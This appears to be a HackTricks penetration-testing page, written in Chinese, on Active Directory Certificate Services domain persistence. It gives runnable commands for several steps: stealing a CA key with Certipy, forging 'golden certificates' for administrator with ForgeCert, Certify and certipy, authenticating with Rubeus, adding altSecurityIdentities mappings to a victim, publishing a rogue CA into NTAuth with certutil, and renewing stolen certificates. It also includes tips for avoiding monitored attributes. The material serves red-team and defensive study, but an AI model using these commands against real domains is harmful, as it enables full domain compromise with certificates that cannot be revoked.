# AD CS 域持久性

{{#include ../../../banners/hacktricks-training.md}}

**这是对域持久性技术的摘要，来源于 [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)。请查看以获取更多细节。**

## 使用被盗 CA 证书伪造证书 (Golden Certificate) - DPERSIST1

如何判断一个证书是 CA 证书？

如果满足下列条件，则可确定该证书为 CA 证书：

- 证书存储在 CA 服务器上，其私钥由机器的 DPAPI 保护，或者如果操作系统支持则由诸如 TPM/HSM 的硬件保护。
- 证书的 Issuer 和 Subject 字段都与 CA 的 Distinguished Name (DN) 相匹配。
- 只有 CA 证书才包含 “CA Version” 扩展。
- 该证书缺少 Extended Key Usage (EKU) 字段。

要提取该证书的私钥，支持的 GUI 方法是在 CA 服务器上使用 `certsrv.msc` 工具。尽管如此，该证书与系统中存储的其他证书并无区别；因此也可以使用诸如 [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) 之类的方法进行提取。

也可以使用 Certipy 获取该证书和私钥，命令如下：
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
在获取 CA 证书及其以 `.pfx` 格式存储的私钥后，可以使用像 [ForgeCert](https://github.com/GhostPack/ForgeCert) 这样的工具生成有效证书：
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> 为确保证书伪造成功，目标用户必须处于活动状态并能够在 Active Directory 中进行身份验证。对像 krbtgt 这样的特殊账户伪造证书无效。

该伪造证书将保持**有效**，直到所指定的结束日期，并且只要根 CA 证书**仍然有效**（通常为 5 到 **10+ 年**）。它也对**机器**有效，因此与 **S4U2Self** 结合使用时，攻击者可以在根 CA 证书有效的整个期间**在任意域机器上维持持久性**。\
此外，使用此方法生成的**证书****无法被撤销**，因为 CA 并不知道它们的存在。

### 在强制证书映射执行（2025+）下运行

自 2025 年 2 月 11 日（KB5014754 推送之后），域控制器对证书映射默认启用 **Full Enforcement**。实际上这意味着你的伪造证书必须满足以下任一条件：

- 包含与目标账户的强绑定（例如，SID 安全扩展），或
- 与目标对象的 `altSecurityIdentities` 属性上的强显式映射配对。

保持持久性的可靠方法是铸造一个伪造证书，使其链向被窃取的 Enterprise CA，然后在受害主体上添加强显式映射：
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Notes
- 如果你能制作包含 SID security extension 的伪造证书，则即使在 Full Enforcement 下也会隐式映射。否则，优先使用显式的强映射。有关显式映射的更多信息，请参见 [account-persistence](account-persistence.md)。
- 撤销在此处对防御方没有帮助：伪造的证书在 CA database 中未知，因此无法被撤销。

#### Full-Enforcement compatible forging (SID-aware)

更新的工具允许你直接嵌入 SID，即使当 DCs 拒绝弱映射时，也能保持 golden certificates 可用：
```bash
# Certify 2.0 integrates ForgeCert and can embed SID
Certify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \
--upn administrator@corp.local --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
--outfile administrator_sid.pfx

# Certipy also supports SID in forged certs
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \
-sid S-1-5-21-1111111111-2222222222-3333333333-500 -out administrator_sid.pfx
```
通过嵌入 SID，你可以避免必须触碰 `altSecurityIdentities`（该属性可能受到监控），同时仍能满足强映射检查。

## 信任恶意 CA 证书 - DPERSIST2

`NTAuthCertificates` 对象被定义为在其 `cacertificate` 属性中包含一个或多个 **CA 证书**，Active Directory (AD) 使用这些证书。**域控制器** 的验证过程会检查 `NTAuthCertificates` 对象是否存在与正在验证的 **证书** 的 Issuer 字段中指定的 **CA** 相匹配的条目。如果找到匹配项，则继续进行身份验证。

如果攻击者能够控制该 AD 对象，则可以向 `NTAuthCertificates` 对象添加一个自签名 CA 证书。通常，只有 **Enterprise Admin** 组的成员，以及位于 **forest root’s domain** 的 **Domain Admins** 或 **Administrators**，被授予修改该对象的权限。他们可以使用 `certutil.exe` 并执行命令 `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA` 来编辑 `NTAuthCertificates` 对象，或通过使用 [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool)。

此技术的其他有用命令：
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
当与之前介绍的使用 ForgeCert 动态生成证书的方法结合使用时，此能力尤其相关。

> 2025 年后映射注意事项：将一个恶意 CA 放入 NTAuth 只会建立对该颁发 CA 的信任。要在 DC 处于 **Full Enforcement** 时使用 leaf 证书进行登录，leaf 必须包含 SID 安全扩展，或者目标对象上必须有强的明确映射（例如，在 `altSecurityIdentities` 中的 Issuer+Serial）。见 {{#ref}}account-persistence.md{{#endref}}。

## 恶意错误配置 - DPERSIST3

通过修改 AD CS 组件的 **security descriptor** 来实现 **persistence** 的机会很多。在 "[Domain Escalation](domain-escalation.md)" 部分描述的修改，具有提升权限的攻击者可以恶意地实施。这包括向敏感组件添加“control rights”（例如 WriteOwner/WriteDACL/等），例如：

- **CA 服务器的 AD 计算机** 对象
- **CA 服务器的 RPC/DCOM 服务**
- 位于 **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** 中的任何 **descendant AD object or container**（例如 Certificate Templates container、Certification Authorities container、NTAuthCertificates 对象等）
- 默认或由组织授权控制 AD CS 权限的 **AD 组**（例如内置的 Cert Publishers 组及其任何成员）

一个恶意实施的示例是：攻击者在域中拥有 **elevated permissions**，向默认的 **`User`** certificate template 添加 **`WriteOwner`** 权限，并将攻击者设置为该权限的主体。要利用此项，攻击者首先会将 **`User`** 模板的所有者更改为自己。随后，在模板上将 **`mspki-certificate-name-flag`** 设置为 **1** 以启用 **`ENROLLEE_SUPPLIES_SUBJECT`**，允许用户在请求中提供 Subject Alternative Name。随后，攻击者可以使用该 **template** **enroll**，选择一个 **domain administrator** 名称作为替代名称，并使用获取的证书作为 DA 进行身份验证。

攻击者为实现长期域持久化可能设置的实际配置（详情与检测见 {{#ref}}domain-escalation.md{{#endref}}）：

- 允许请求者提供 SAN 的 CA 策略标志（例如启用 `EDITF_ATTRIBUTESUBJECTALTNAME2`）。这使得类似 ESC1 的路径仍可被利用。
- 允许颁发具备认证能力的证书的模板 DACL 或设置（例如添加 Client Authentication EKU、启用 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`）。
- 控制 `NTAuthCertificates` 对象或 CA 容器，以在防御方尝试清理时持续重新引入恶意颁发者。

> [!TIP]
> 在应用 KB5014754 的强化环境中，将这些错误配置与显式强映射（`altSecurityIdentities`）配合，可确保即使 DC 强制执行强映射，您颁发或伪造的证书仍然可用。

### Certificate renewal abuse (ESC14) for persistence

如果您侵害了一个具备认证能力的证书（或 Enrollment Agent 证书），只要颁发模板仍然发布且您的 CA 仍信任该颁发链，就可以**无限期地续期**该证书。续期保留原始身份绑定但延长有效期，这使得驱逐变得困难，除非修复模板或重新发布 CA。
```bash
# Renew a stolen user cert to extend validity
certipy req -ca CORP-DC-CA -template User -pfx stolen_user.pfx -renew -out user_renewed_2026.pfx

# Renew an on-behalf-of cert issued via an Enrollment Agent
certipy req -ca CORP-DC-CA -on-behalf-of 'CORP/victim' -pfx agent.pfx -renew -out victim_renewed.pfx
```
如果域控制器处于 **Full Enforcement**，请添加 `-sid <victim SID>`（或使用仍包含 SID 安全扩展的模板），这样续期的叶证书在不触及 `altSecurityIdentities` 的情况下仍能维持强映射。拥有 CA 管理权限的攻击者也可能调整 `policy\RenewalValidityPeriodUnits` 来延长续期有效期，然后再向自己签发证书。

## 参考资料

- [Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings)](https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [Certipy – Command Reference and forge/auth usage](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [SpecterOps – Certify 2.0 (integrated forge with SID support)](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [ESC14 renewal abuse overview](https://www.adcs-security.com/attacks/esc14)
- [0xdf – HTB: Certificate (SeManageVolumePrivilege to exfil CA keys → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../../banners/hacktricks-training.md}}
